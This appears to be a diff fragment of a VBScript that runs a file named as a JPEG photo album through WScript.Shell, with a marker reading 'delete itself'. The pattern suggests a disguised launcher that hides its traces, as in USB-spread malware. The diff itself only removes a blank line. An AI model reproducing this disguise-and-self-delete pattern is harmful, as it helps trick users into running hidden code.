@@ -17,7 +17,6 @@ set objShell = CreateObject("Wscript.Shell")
 strPath = objShell.CurrentDirectory
 
 strPath = "电子相册.jpg /e," & strPath
-
 objShell.Run strPath
 
 -删除自身-
